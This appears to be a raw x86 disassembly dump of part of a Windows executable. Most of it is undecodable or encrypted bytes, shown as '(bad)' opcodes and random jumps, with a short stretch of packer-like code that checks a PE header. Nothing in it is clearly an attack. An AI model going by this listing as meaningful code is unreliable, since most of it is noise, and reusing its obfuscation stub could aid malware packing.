  404a21:	or     ebx,DWORD PTR [ebx-0xea19a3]
  404a27:	pop    ecx
  404a28:	pop    ss
  404a29:	jmp    0x404a98
  404a2b:	cmp    eax,0x32ea3920
  404a30:	jmp    0xf2e137a5
  404a35:	xlat   BYTE PTR ds:[ebx]
  404a36:	test   eax,0x6ec31408
  404a3b:	mov    eax,ds:0xaee162a2
  404a40:	fld    QWORD PTR [esi+0x22f472bd]
  404a46:	jecxz  0x404ab7
  404a48:	pop    edi
  404a49:	mov    dl,0xa8
  404a4b:	xchg   ecx,eax
  404a4c:	sub    al,0x15
  404a4e:	pop    edi
  404a4f:	and    eax,0x166670c3
  404a54:	dec    ecx
  404a55:	out    0x4,al
  404a57:	xchg   ebx,eax
  404a58:	fild   DWORD PTR [ebx-0x1b]
  404a5b:	dec    ebp
  404a5c:	mov    al,ds:0x7355226a
  404a61:	xlat   BYTE PTR ds:[ebx]
  404a62:	std    
  404a63:	(bad)  
  404a64:	iret   
  404a65:	pop    ss
  404a66:	adc    DWORD PTR [edx-0x28],edx
  404a69:	cmp    al,BYTE PTR [esi-0x5009f86]
  404a6f:	adc    eax,0x71cce4eb
  404a74:	enter  0xd411,0xfb
  404a78:	mov    cl,BYTE PTR [ebx+0x260f1c38]
  404a7e:	and    ecx,DWORD PTR [ecx+0x71]
  404a81:	inc    edx
  404a82:	pusha  
  404a83:	xchg   ecx,ecx
  404a85:	xchg   DWORD PTR [ebp-0x59],esi
  404a88:	push   ds
  404a89:	ficomp WORD PTR [edi]
  404a8b:	nop
  404a8c:	mov    al,0xa6
  404a8e:	jno    0x404a93
  404a90:	shl    esp,1
  404a92:	imul   ebx,DWORD PTR [esi+0x5f],0xfffffff5
  404a96:	(bad)  
  404a97:	jmp    0x6417:0x64912aaf
  404a9e:	cdq    
  404a9f:	add    eax,0xba833ee5
  404aa4:	cli    
  404aa5:	mov    al,0x86
  404aa7:	lock cmovnp ebx,DWORD PTR [ecx-0xbd6a2ff]
  404aaf:	fstp   DWORD PTR [esi]
  404ab1:	mov    ds:0x5650b689,eax
  404ab6:	loope  0x404b37
  404ab8:	sub    dl,cl
  404aba:	ins    BYTE PTR es:[edi],dx
  404abb:	shl    ch,0x1f
  404abe:	scas   al,BYTE PTR es:[edi]
  404abf:	out    dx,al
  404ac0:	cmc    
  404ac1:	cmp    ecx,DWORD PTR [ebx]
  404ac3:	adc    al,0x6d
  404ac5:	int3   
  404ac6:	sub    al,0x6f
  404ac8:	fadd   QWORD PTR [edx-0x4d]
  404acb:	int    0xf4
  404acd:	lds    esi,FWORD PTR [ebp+0x4f]
  404ad0:	stos   BYTE PTR es:[edi],al
  404ad1:	ja     0x404ab7
  404ad3:	inc    edi
  404ad4:	into   
  404ad5:	inc    ecx
  404ad6:	pop    esp
  404ad7:	ret    
  404ad8:	stos   DWORD PTR es:[edi],eax
  404ad9:	retf   0xeb7b
  404adc:	cmp    al,0x24
  404ade:	sbb    eax,0x6bf77ad9
  404ae3:	aas    
  404ae4:	add    edx,ebx
  404ae6:	fst    DWORD PTR [ebp-0x2a]
  404ae9:	out    dx,al
  404aea:	call   0x9153:0xbf5e8dd0
  404af1:	mov    ds:0x85e14b44,eax
  404af6:	mov    bh,0x34
  404af8:	stos   BYTE PTR es:[edi],al
  404af9:	jmp    DWORD PTR [esi+0x2d]
  404afc:	xchg   edi,eax
  404afd:	lds    edi,FWORD PTR [edi-0x1305af92]
  404b03:	shl    ebx,0xd2
  404b06:	cdq    
  404b07:	in     al,dx
  404b08:	cdq    
  404b09:	outs   dx,BYTE PTR ds:[esi]
  404b0a:	jo     0x404b16
  404b0c:	mov    ebp,0x1e9cf854
  404b11:	xlat   BYTE PTR ds:[ebx]
  404b12:	xor    dl,BYTE PTR [eax-0x59]
  404b15:	cli    
  404b16:	mov    ch,0x98
  404b18:	dec    esp
  404b19:	stos   DWORD PTR es:[edi],eax
  404b1a:	xchg   ecx,eax
  404b1b:	and    esi,DWORD PTR [edi-0x284b63a1]
  404b21:	je     0x404b23
  404b23:	cs out dx,al
  404b25:	shr    DWORD PTR [ebx+0x58],0x60
  404b29:	or     edx,DWORD PTR [edx+0x51f565d5]
  404b2f:	rcl    BYTE PTR [edx+0x26],cl
  404b32:	dec    edx
  404b33:	(bad)  
  404b34:	test   eax,0x55ace615
  404b39:	mov    BYTE PTR [esi],cl
  404b3b:	clc    
  404b3c:	xor    al,0x5
  404b3e:	jno    0x404b65
  404b40:	(bad)  
  404b43:	mov    esp,0x56c43119
  404b48:	iret   
  404b49:	pushf  
  404b4a:	pop    esi
  404b4b:	xor    eax,0xd900bd6b
  404b50:	pop    edi
  404b51:	mov    ah,0x6c
  404b53:	stos   BYTE PTR es:[edi],al
  404b54:	add    DWORD PTR [ecx-0x75],edx
  404b57:	imul   BYTE PTR [ebx-0x534c4b78]
  404b5d:	outs   dx,DWORD PTR ds:[esi]
  404b5e:	cmp    BYTE PTR [ebp-0x46],dh
  404b61:	fisttp WORD PTR [ebx]
  404b63:	cs aas 
  404b65:	or     ecx,DWORD PTR [ebx-0xe41e12a]
  404b6b:	cmp    DWORD PTR [eax+ebx*2],esp
  404b6e:	adc    eax,0xf37bb6c3
  404b73:	fs lock jnp 0x404b4f
  404b77:	cld    
  404b78:	adc    ebx,DWORD PTR [edx-0x49]
  404b7b:	inc    esp
  404b7c:	out    0xb9,eax
  404b7e:	mov    al,0x8b
  404b80:	les    edi,FWORD PTR [esi-0x32]
  404b83:	stc    
  404b84:	icebp  
  404b85:	imul   esp,DWORD PTR [edx-0x7a1a286e],0xf21364d2
  404b8f:	in     eax,dx
  404b90:	push   0x29
  404b92:	jp     0x404bee
  404b94:	idiv   BYTE PTR [ebx+0x39]
  404b97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404b98:	test   BYTE PTR [esi-0x57],dh
  404b9b:	add    al,0x18
  404b9d:	(bad)  
  404b9e:	xchg   esp,eax
  404b9f:	(bad)  
  404ba0:	fadd   DWORD PTR [ebp-0x50813c2f]
  404ba6:	sub    BYTE PTR [ebx-0x6a],al
  404ba9:	mov    edx,DWORD PTR [edx]
  404bab:	xchg   edx,eax
  404bac:	outs   dx,BYTE PTR ds:[esi]
  404bad:	int3   
  404bae:	(bad)  
  404baf:	int3   
  404bb0:	mov    BYTE PTR [ebp+0x539a8ebe],dl
  404bb6:	jecxz  0x404b49
  404bb8:	out    dx,eax
  404bb9:	(bad)  
  404bba:	aad    0xad
  404bbc:	mov    cl,0x29
  404bbe:	mov    cl,0xf7
  404bc0:	jo     0x404ba1
  404bc2:	xchg   ecx,eax
  404bc3:	fst    DWORD PTR [eax]
  404bc5:	mov    esi,0xe1354b4a
  404bca:	xor    al,BYTE PTR [edx-0x1e]
  404bcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404bce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404bcf:	adc    BYTE PTR [esi+0x5],dh
  404bd2:	push   cs
  404bd3:	std    
  404bd4:	cmc    
  404bd5:	out    0x2d,eax
  404bd7:	adc    eax,DWORD PTR [edi+0x12e1be16]
  404bdd:	sub    al,0x10
  404bdf:	jno    0x404bab
  404be1:	fmul   DWORD PTR [ebp-0x1c]
  404be4:	mov    edi,0x7c49deae
  404be9:	rol    DWORD PTR [edx-0x38ee7c45],1
  404bef:	imul   ecx,DWORD PTR [edi-0x18],0x21
  404bf3:	cmc    
  404bf4:	loop   0x404bc2
  404bf6:	or     eax,DWORD PTR [edi-0x5d85788a]
  404bfc:	pusha  
  404bfd:	(bad)  
  404bfe:	in     eax,0x58
  404c00:	jl     0x404b9f
  404c02:	mov    eax,0x3d595a77
  404c07:	adc    ah,BYTE PTR [ecx+ebp*1-0x65]
  404c0b:	xchg   ebp,eax
  404c0c:	daa    
  404c0d:	es (bad) 
  404c0f:	aad    0xc6
  404c11:	ins    DWORD PTR es:[edi],dx
  404c12:	sysret 
  404c14:	cdq    
  404c15:	xchg   ebp,eax
  404c16:	scas   eax,DWORD PTR es:[edi]
  404c17:	push   esi
  404c18:	push   es
  404c19:	mov    ch,0x49
  404c1b:	es jnp 0x404c58
  404c1e:	mov    dh,0x20
  404c20:	rcl    BYTE PTR [ebp-0x5e933584],cl
  404c26:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c27:	jb     0x404c0b
  404c29:	test   eax,0x476e2705
  404c2e:	fcmovu st,st(4)
  404c30:	adc    DWORD PTR [ecx],0x3
  404c33:	aaa    
  404c34:	sub    cl,ah
  404c36:	(bad)  
  404c37:	hlt    
  404c38:	aam    0x1c
  404c3a:	sub    esp,DWORD PTR [edi-0x48]
  404c3d:	push   cs
  404c3e:	inc    ecx
  404c3f:	cs adc al,0xa9
  404c42:	mov    ch,0xec
  404c44:	adc    BYTE PTR [ecx],0xdf
  404c47:	mov    bh,0xfe
  404c49:	mov    esp,0xbadc4fc5
  404c4e:	mov    dh,0xa7
  404c50:	push   eax
  404c51:	(bad)  
  404c52:	lock inc ecx
  404c54:	lods   eax,DWORD PTR ds:[esi]
  404c55:	enter  0x39a4,0xa6
  404c59:	mov    gs,edi
  404c5b:	xchg   BYTE PTR [esi],ah
  404c5d:	push   DWORD PTR [edx+edx*8+0x79e8c6f0]
  404c64:	and    edx,DWORD PTR ds:0x6b517330
  404c6a:	inc    eax
  404c6b:	scas   eax,DWORD PTR es:[edi]
  404c6c:	cmp    al,0x22
  404c6e:	ja     0x404c9d
  404c70:	fwait
  404c71:	dec    ecx
  404c72:	dec    esp
  404c73:	jmp    DWORD PTR [ebp-0x5a5d6723]
  404c79:	sub    al,0xed
  404c7b:	dec    ebp
  404c7c:	and    al,0x0
  404c7e:	fistp  WORD PTR [edx]
  404c80:	stos   BYTE PTR es:[edi],al
  404c81:	das    
  404c82:	fdiv   QWORD PTR [eax-0x6b6fd78c]
  404c88:	daa    
  404c89:	iret   
  404c8a:	ins    DWORD PTR es:[edi],dx
  404c8b:	lea    esp,[edi]
  404c8d:	mov    edi,DWORD PTR [esi-0x57d26992]
  404c93:	jmp    0xa793:0x68801fbc
  404c9a:	sbb    eax,0xa421e197
  404c9f:	mov    ah,0x7c
  404ca1:	adc    edx,DWORD PTR [ecx-0x7660270f]
  404ca7:	jne    0x404ce4
  404ca9:	jae    0x404d12
  404cab:	pop    es
  404cac:	(bad)  
  404cad:	pop    ebp
  404cae:	clc    
  404caf:	adc    cl,BYTE PTR [ecx-0xa5f8357]
  404cb5:	pop    ecx
  404cb6:	out    dx,al
  404cb7:	aam    0x72
  404cb9:	repz dec ebp
  404cbb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cbc:	or     DWORD PTR [edx+0x2e],edx
  404cbf:	mov    ah,0xc6
  404cc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc2:	and    al,0x92
  404cc4:	pop    edi
  404cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404cc6:	mov    esp,0x5c79fc56
  404ccb:	jg     0x404d26
  404ccd:	out    dx,eax
  404cce:	add    bl,dl
  404cd0:	nop
  404cd1:	cs iret 
  404cd3:	inc    esp
  404cd4:	shr    ebp,cl
  404cd6:	pop    ebx
  404cd7:	mov    al,0xfd
  404cd9:	or     ah,BYTE PTR [eax]
  404cdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cdc:	ret    0x7c82
  404cdf:	int3   
  404ce0:	in     al,0x18
  404ce2:	xor    BYTE PTR [esi],al
  404ce4:	jae    0x404c8e
  404ce6:	inc    edx
  404ce7:	mov    WORD PTR [esi],cs
  404ce9:	fcom   st(6)
  404ceb:	sub    DWORD PTR [ebx+0x75f45508],eax
  404cf1:	enter  0xb2c0,0xee
  404cf5:	inc    esp
  404cf6:	push   0xffffffa6
  404cf8:	pop    esp
  404cf9:	outs   dx,BYTE PTR ds:[esi]
  404cfa:	inc    esp
  404cfb:	sti    
  404cfc:	adc    eax,0x1569ad90
  404d01:	ret    0x348a
  404d04:	les    esp,FWORD PTR ds:0xddfdfb23
  404d0a:	iret   
  404d0b:	ins    BYTE PTR es:[edi],dx
  404d0c:	cld    
  404d0d:	adc    bl,BYTE PTR [ecx]
  404d0f:	xchg   edi,eax
  404d10:	test   al,0x32
  404d12:	mov    ?,WORD PTR ss:[ecx+0x7363e781]
  404d19:	daa    
  404d1a:	jp     0x404cbd
  404d1c:	dec    eax
  404d1d:	pop    edx
  404d1e:	xlat   BYTE PTR ds:[ebx]
  404d1f:	ja     0x404d55
  404d21:	pop    esp
  404d22:	(bad)  
  404d23:	fxch   st(7)
  404d25:	test   al,0x41
  404d27:	jg     0x404ce8
  404d29:	(bad)  
  404d2a:	mov    gs,WORD PTR [ebp+0x685a82e0]
  404d30:	test   DWORD PTR [ebx-0x29810ceb],ebx
  404d36:	jecxz  0x404d25
  404d38:	jmp    0x404d11
  404d3a:	ins    DWORD PTR es:[edi],dx
  404d3b:	mov    eax,0xbf6a397f
  404d40:	add    BYTE PTR [edi],bl
  404d42:	cmp    eax,0x2f71078b
  404d47:	daa    
  404d48:	lods   eax,DWORD PTR ds:[esi]
  404d49:	push   ss
  404d4a:	push   edi
  404d4b:	dec    edi
  404d4c:	xchg   BYTE PTR cs:[edi-0x73c8fb63],ch
  404d53:	mov    eax,0x2dd7e445
  404d58:	stc    
  404d59:	jge    0x404d74
  404d5b:	and    dl,BYTE PTR [edx]
  404d5d:	xchg   ebp,eax
  404d5e:	adc    al,0x4c
  404d60:	test   BYTE PTR [esi+eiz*1+0x7df210fc],0x48
  404d68:	fisttp DWORD PTR [bx+si-0x28]
  404d6c:	cmp    BYTE PTR [esi],0x3e
  404d6f:	loop   0x404d76
  404d71:	mov    cl,0x15
  404d73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d74:	dec    ecx
  404d75:	(bad)  
  404d76:	lahf   
  404d77:	push   0x49
  404d79:	repnz push 0x6d5192cd
  404d7f:	(bad)  
  404d82:	or     eax,0x4b3827e8
  404d87:	dec    edi
  404d88:	loop   0x404db2
  404d8a:	frstor [edi-0x6f368197]
  404d90:	sub    ebx,DWORD PTR [eax+0x69284a72]
  404d96:	stos   DWORD PTR es:[edi],eax
  404d97:	mov    ah,0x86
  404d99:	fdiv   QWORD PTR es:[eax+0xb]
  404d9d:	push   edi
  404d9e:	dec    esi
  404d9f:	imul   ecx,DWORD PTR [ebx+0x7],0x1ccbff7e
  404da6:	cdq    
  404da7:	xchg   edi,eax
  404da8:	in     eax,dx
  404da9:	add    eax,0xbedbc941
  404dae:	mov    al,0x15
  404db0:	lods   eax,DWORD PTR ds:[esi]
  404db1:	add    edx,DWORD PTR [esi+0x58f025b8]
  404db7:	test   cx,dx
  404dba:	or     eax,DWORD PTR [eax+0x3a]
  404dbd:	add    dh,dh
  404dbf:	cmp    ebx,DWORD PTR [ebx]
  404dc1:	mov    ecx,DWORD PTR [esp+eiz*2]
  404dc4:	es pushf 
  404dc6:	inc    ecx
  404dc7:	pusha  
  404dc8:	and    eax,DWORD PTR [ebx+0xcf27464]
  404dce:	es xchg esp,eax
  404dd0:	or     al,BYTE PTR [eax-0x24e7c4fa]
  404dd6:	sbb    dl,cl
  404dd8:	test   eax,0x505bb3ba
  404ddd:	retf   
  404dde:	or     DWORD PTR [edi+0x1d64fe5],ecx
  404de4:	dec    edx
  404de5:	daa    
  404de6:	repz aam 0x65
  404de9:	ffree  st(2)
  404deb:	sbb    ebx,DWORD PTR [edi+0x67]
  404dee:	mov    edx,0xdc7c0d46
  404df3:	cmc    
  404df4:	fcom   QWORD PTR [eax+0x7cac56f6]
  404dfa:	int    0x13
  404dfc:	jmp    0xe999:0xc4f2fee9
  404e03:	jno    0x404e73
  404e05:	mov    edi,0x9d057958
  404e0a:	ret    
  404e0b:	mov    DWORD PTR ds:0xd3414bff,eax
  404e11:	enter  0xd987,0x25
  404e15:	out    0xc9,eax
  404e17:	and    ch,BYTE PTR ds:0xb82b0c25
  404e1d:	lea    esi,[ecx+0x6f]
  404e20:	daa    
  404e21:	lods   eax,DWORD PTR ds:[esi]
  404e22:	cmp    bl,ch
  404e24:	je     0x404e37
  404e26:	or     al,0xa9
  404e28:	mov    ebp,0xb990f0b2
  404e2d:	addr16 ss loope 0x404e82
  404e31:	mov    cl,0x18
  404e33:	and    eax,0xc7c7ba23
  404e38:	mov    ch,BYTE PTR [esi-0x7]
  404e3b:	mov    eax,0x551af32a
  404e40:	aam    0x56
  404e42:	xor    edx,ebp
  404e44:	in     al,0xdd
  404e46:	jbe    0x404dd3
  404e48:	call   0x5cb5:0x62d8f2a7
  404e4f:	adc    BYTE PTR [edi+0x5],ch
  404e52:	ins    BYTE PTR es:[edi],dx
  404e53:	imul   esi,DWORD PTR [ecx+0x1c],0xffffff86
  404e57:	pusha  
  404e58:	loop   0x404e1a
  404e5a:	cld    
  404e5b:	and    bl,dl
  404e5d:	test   eax,0x79de5d7d
  404e62:	jp     0x404ed6
  404e64:	loop   0x404e1d
  404e66:	fbld   TBYTE PTR [ecx-0x33]
  404e69:	scas   eax,DWORD PTR es:[edi]
  404e6a:	mov    gs,WORD PTR [esi]
  404e6c:	fs mov cl,0xb2
  404e6f:	xor    BYTE PTR [edx],0x3f
  404e72:	call   0x3088:0x55b29712
  404e79:	jmp    0x5ac4:0xc5d69505
  404e80:	test   DWORD PTR [edi+0x70c9e772],eax
  404e86:	in     eax,dx
  404e87:	ins    BYTE PTR es:[edi],dx
  404e88:	and    BYTE PTR [ebp-0x12],bh
  404e8b:	mov    ecx,DWORD PTR [edx+0x71c28c96]
  404e91:	neg    ecx
  404e93:	leave  
  404e94:	std    
  404e95:	mov    ebp,0x6febae4d
  404e9a:	ins    BYTE PTR es:[edi],dx
  404e9b:	sub    BYTE PTR gs:[ebx+0x5794d909],ah
  404ea2:	in     al,dx
  404ea3:	sbb    edi,ebx
  404ea5:	int    0xe4
  404ea7:	mov    dl,0x6
  404ea9:	cs cmp esp,ebp
  404eac:	in     eax,dx
  404ead:	add    bh,0xa5
  404eb0:	xlat   BYTE PTR ds:[ebx]
  404eb1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404eb2:	add    al,0x6
  404eb4:	repnz dec ebx
  404eb6:	in     al,0x48
  404eb8:	jl     0x404e5e
  404eba:	ret    
  404ebb:	jb     0x404e84
  404ebd:	sub    ch,BYTE PTR [esi]
  404ebf:	sbb    bh,ch
  404ec1:	pop    edx
  404ec2:	loopne 0x404f3d
  404ec4:	out    dx,eax
  404ec5:	lods   eax,DWORD PTR ds:[esi]
  404ec6:	jmp    0x41ba8054
  404ecb:	and    dh,ah
  404ecd:	rcl    DWORD PTR [ebx],cl
  404ecf:	dec    esi
  404ed0:	push   ebp
  404ed1:	in     eax,dx
  404ed2:	fwait
  404ed3:	push   esp
  404ed4:	les    edx,FWORD PTR [ecx-0x2b]
  404ed7:	jle    0x404eba
  404ed9:	mov    ds:0x96fe50aa,al
  404ede:	call   0x1e20:0x35434cf8
  404ee5:	push   esi
  404ee6:	icebp  
  404ee7:	sub    BYTE PTR [eax-0x2d],bh
  404eea:	push   esp
  404eeb:	shr    BYTE PTR [ebx+0x575736df],1
  404ef1:	outs   dx,BYTE PTR ds:[esi]
  404ef2:	retf   0xd8c
  404ef5:	lea    edx,[ebp-0x59]
  404ef8:	retf   0x2e20
  404efb:	dec    edi
  404efc:	sbb    al,0x4
  404efe:	fild   DWORD PTR [edi-0x40be9f17]
  404f04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f05:	sti    
  404f06:	aam    0x9d
  404f08:	pop    ebx
  404f09:	dec    ecx
  404f0a:	retf   0xb01f
  404f0d:	mov    esi,0x543dcc77
  404f12:	mov    eax,esp
  404f14:	add    esp,ebx
  404f16:	dec    edi
  404f17:	xchg   ebx,eax
  404f18:	call   0x2af8:0x98e0239f
  404f1f:	(bad)  
  404f20:	nop
  404f21:	add    DWORD PTR [ecx-0x57],0x76
  404f25:	sbb    al,BYTE PTR [ebx+0x55]
  404f28:	int3   
  404f29:	aaa    
  404f2a:	ror    esp,cl
  404f2c:	out    0x12,eax
  404f2e:	data16 add BYTE PTR [edi+0x68c8bc5a],bh
  404f35:	inc    ecx
  404f36:	push   0x83dd0b48
  404f3b:	inc    edx
  404f3c:	outs   dx,BYTE PTR ds:[esi]
  404f3d:	inc    ebp
  404f3e:	dec    edi
  404f3f:	add    DWORD PTR [ecx-0x71],edi
  404f42:	xor    al,BYTE PTR [ebp-0x48a678ec]
  404f48:	pop    esp
  404f49:	sub    BYTE PTR [edx-0x5b],bh
  404f4c:	dec    edx
  404f4d:	stos   DWORD PTR es:[edi],eax
  404f4e:	test   DWORD PTR [ebx-0xf238ec7],ebp
  404f54:	jge    0x404f70
  404f56:	fs stos DWORD PTR es:[edi],eax
  404f58:	fimul  WORD PTR [edi+0x2a]
  404f5b:	jl     0x404f93
  404f5d:	xchg   ch,cl
  404f5f:	and    DWORD PTR [eax-0x47],ebx
  404f62:	mov    ah,0xed
  404f64:	xor    ch,BYTE PTR [edx]
  404f66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f67:	mov    ss,WORD PTR [eax-0x57]
  404f6a:	repnz into 
  404f6c:	nop
  404f6d:	add    ah,cl
  404f6f:	sub    eax,0x5bfa9b68
  404f74:	jbe    0x404f8f
  404f76:	mov    dh,0x7c
  404f78:	in     al,dx
  404f79:	pop    eax
  404f7a:	fcomp  DWORD PTR [ebx+0x79]
  404f7d:	cli    
  404f7e:	sub    eax,0x52b3a6f1
  404f83:	and    eax,0x458be600
  404f88:	cld    
  404f89:	mov    edi,DWORD PTR [ebp-0x8]
  404f8c:	xor    edi,edx
  404f8e:	add    edi,esi
  404f90:	mov    esi,DWORD PTR [ebp+0x8]
  404f93:	imul   edi,ecx
  404f96:	mov    ebx,DWORD PTR [ebp+0xc]
  404f99:	xor    eax,edx
  404f9b:	add    eax,ecx
  404f9d:	mov    al,BYTE PTR [ebx+eax*1+0x3272e0]
  404fa4:	mov    BYTE PTR [edi+esi*1],al
  404fa7:	mov    eax,DWORD PTR [ebp-0x8]
  404faa:	mov    esi,DWORD PTR [ebp+0x10]
  404fad:	xor    eax,edx
  404faf:	xor    ebx,ebx
  404fb1:	add    esi,0xfabdbee9
  404fb7:	adc    ebx,0xffffffff
  404fba:	lea    ecx,[ecx+eax*1+0x3272e0]
  404fc1:	xor    edi,edi
  404fc3:	xor    esi,0x8a29a12b
  404fc9:	xor    ebx,0x0
  404fcc:	mov    eax,ecx
  404fce:	add    eax,0xfabdbee9
  404fd3:	adc    edi,0xffffffff
  404fd6:	xor    eax,0x8a29a12b
  404fdb:	xor    edi,0x0
  404fde:	cmp    eax,esi
  404fe0:	jne    0x402c2e
  404fe6:	cmp    edi,ebx
  404fe8:	jne    0x402c2e
  404fee:	mov    eax,0xf89c85b8
  404ff3:	pop    ebx
  404ff4:	pop    edi
  404ff5:	pop    esi
  404ff6:	leave  
  404ff7:	ret    0xc
  404ffa:	push   ebp
  404ffb:	mov    ebp,esp
  404ffd:	push   ecx
  404ffe:	sub    DWORD PTR ds:0x429018,ecx
  405004:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  40500b:	mov    eax,DWORD PTR [ebp+0x8]
  40500e:	movsx  eax,BYTE PTR [eax]
  405011:	or     ecx,edx
  405013:	mov    edx,0x3272e0
  405018:	sub    ecx,0x5218
  40501e:	sub    eax,edx
  405020:	mov    ecx,DWORD PTR ds:0x42d01c
  405026:	xor    DWORD PTR ds:0x429008,ecx
  40502c:	mov    ecx,0x7510899
  405031:	sbb    DWORD PTR ds:0x42d01c,0x42b014
  40503b:	xor    eax,ecx
  40503d:	mov    DWORD PTR ds:0x429010,0x6785
  405047:	cmp    eax,0xf89c85f4
  40504c:	mov    DWORD PTR ds:0x42c004,0x3ff8
  405056:	jne    0x4050b5
  40505c:	xor    DWORD PTR ds:0x42c000,0xe2d
  405066:	mov    eax,DWORD PTR [ebp+0x8]
  405069:	and    DWORD PTR ds:0x42c00c,0x622d
  405073:	push   esi
  405074:	mov    esi,DWORD PTR [ebp+0x8]
  405077:	xor    DWORD PTR ds:0x42b000,0x42a008
  405081:	add    esi,DWORD PTR [eax+0x3c]
  405084:	mov    DWORD PTR [ebp+0x8],esi
  405087:	and    eax,DWORD PTR ds:0x42c010
  40508d:	mov    eax,DWORD PTR [ebp-0x4]
  405090:	mov    esi,DWORD PTR ds:0x42b000
  405096:	add    DWORD PTR ds:0x42a010,esi
  40509c:	mov    esi,DWORD PTR [ebp+0x8]
  40509f:	xor    eax,ecx
  4050a1:	add    eax,edx
  4050a3:	cmp    DWORD PTR [esi+0x54],eax
  4050a6:	pop    esi
  4050a7:	je     0x4050b5
  4050ad:	mov    eax,DWORD PTR [ebp+0x8]
  4050b0:	jmp    0x4050bc
  4050b5:	mov    eax,DWORD PTR [ebp-0x4]
  4050b8:	xor    eax,ecx
  4050ba:	add    eax,edx
  4050bc:	leave  
  4050bd:	ret    0x4
  4050c0:	push   ebp
  4050c1:	mov    ebp,esp
  4050c3:	sub    esp,0x40
  4050c6:	sub    DWORD PTR ds:0x429028,0x42d01c
  4050d0:	push   ebx
  4050d1:	push   esi
  4050d2:	push   edi
  4050d3:	lea    eax,[ebp-0x1c]
  4050d6:	push   eax
  4050d7:	lea    eax,[ebp-0x18]
  4050da:	adc    DWORD PTR ds:0x42c014,0x5fe2
  4050e4:	jmp    0x407491
  4050e9:	outs   dx,DWORD PTR ds:[esi]
  4050ea:	or     dh,BYTE PTR ds:0x57fbfb4c
  4050f0:	or     eax,0x82990c06
  4050f5:	outs   dx,DWORD PTR ds:[esi]
  4050f6:	ss or  al,0xfc
  4050f9:	dec    esp
  4050fa:	pop    edi
  4050fb:	jp     0x405177
  4050fd:	jmp    0xb323:0x2c7a7a5f
  405104:	in     eax,0x54
  405106:	je     0x405136
  405108:	jge    0x4050e3
  40510a:	adc    ah,bl
  40510c:	push   edx
  40510d:	sbb    DWORD PTR [esi-0x24fb042e],0x4
  405114:	inc    edi
  405115:	dec    edx
  405116:	retf   0xe44d
  405119:	xor    al,0x6f
  40511b:	pop    esi
  40511c:	inc    ebp
  40511d:	sbb    eax,0x739258a0
  405122:	sub    ah,al
  405124:	cmp    eax,0xa90660e1
  405129:	pop    es
  40512a:	mov    al,ds:0xce693b99
  40512f:	and    ah,dl
  405131:	inc    ebp
  405132:	imul   ebp,DWORD PTR [esi-0x1],0xc61e0a8d
  405139:	mov    BYTE PTR [edi-0x51],al
  40513c:	mov    dl,0x74
  40513e:	repnz push 0xd2b9c910
  405144:	pop    ecx
  405145:	xchg   ecx,esp
  405147:	test   al,0x70
  405149:	(bad)  
  40514a:	adc    eax,0x39da4fe4
  40514f:	xor    ah,BYTE PTR [ecx+0x6f571195]
  405155:	or     eax,0x6683aeb5
  40515b:	hlt    
  40515c:	add    bl,bl
  40515e:	sbb    ebx,DWORD PTR [esi-0x58492eaf]
  405164:	fmul   DWORD PTR [eax]
  405166:	cmp    bl,ch
  405168:	div    DWORD PTR [esi-0x6f]
  40516b:	pop    ds
  40516c:	jp     0x405163
  40516e:	inc    esi
  40516f:	sub    al,0xa
  405171:	cwde   
  405172:	or     BYTE PTR [ecx+0x486a6306],al
  405178:	std    
  405179:	adc    ebx,DWORD PTR [ebx-0x6f]
  40517c:	mov    BYTE PTR [eax],0x8e
  40517f:	sti    
  405180:	call   0xf53b634e
  405185:	adc    DWORD PTR [eax],esi
  405187:	add    edi,DWORD PTR [edx+ebp*4-0x72]
  40518b:	or     bh,BYTE PTR [edi+0x4c91a106]
  405191:	mov    ebx,DWORD PTR [esi+0x7c]
  405194:	mov    eax,ds:0x1f2ef20f
  405199:	jmp    0x405199
  40519b:	mov    edx,ebp
  40519d:	push   eax
  40519e:	xor    DWORD PTR [eax+0x10],edx
  4051a1:	or     al,0xe8
  4051a3:	outs   dx,DWORD PTR ds:[esi]
  4051a4:	cmp    eax,0x9fb18c4e
  4051a9:	push   ebp
  4051aa:	mov    cl,0x3f
  4051ac:	and    eax,0xb72029a9
  4051b1:	loope  0x4051ee
  4051b3:	pop    ebx
  4051b4:	xchg   edx,eax
  4051b5:	call   0xb65959e4
  4051ba:	jg     0x4051c4
  4051bc:	outs   dx,BYTE PTR ds:[esi]
  4051bd:	out    0xa3,al
  4051bf:	jae    0x405240
  4051c1:	jnp    0x40515b
  4051c3:	aam    0x4d
  4051c5:	push   eax
  4051c6:	ficomp WORD PTR [edi+0x332f4941]
  4051cc:	push   esp
  4051cd:	mov    WORD PTR [eax],?
  4051cf:	retf   
  4051d0:	cli    
  4051d1:	push   es
  4051d2:	fcmovnu st,st(7)
  4051d4:	arpl   WORD PTR [ecx+0x1081ad35],bp
  4051da:	cmp    eax,0xe205a268
  4051df:	ret    
  4051e0:	cs jge 0x4051b4
  4051e3:	xor    al,0xca
  4051e5:	xor    BYTE PTR [edx],ch
  4051e7:	or     DWORD PTR [esi-0x2bca3589],edx
  4051ed:	or     ah,BYTE PTR ds:0x1363432
  4051f3:	sub    DWORD PTR [edi+0x1aada96b],0x50
  4051fa:	push   esp
  4051fb:	jg     0x40521f
  4051fd:	and    al,0x51
  4051ff:	mov    ds:0xf062e40f,eax
  405204:	les    ebx,FWORD PTR [esi+0x3e77e355]
  40520a:	xchg   ebx,eax
  40520b:	push   es
  40520c:	scas   al,BYTE PTR es:[edi]
  40520d:	je     0x40525e
  40520f:	out    0xc1,eax
  405211:	xor    BYTE PTR [edi],0x43
  405214:	scas   al,BYTE PTR es:[edi]
  405215:	repz pop ds
  405217:	pop    ebx
  405218:	jmp    0x82d6:0xe744221c
  40521f:	lods   eax,DWORD PTR ds:[esi]
  405220:	popa   
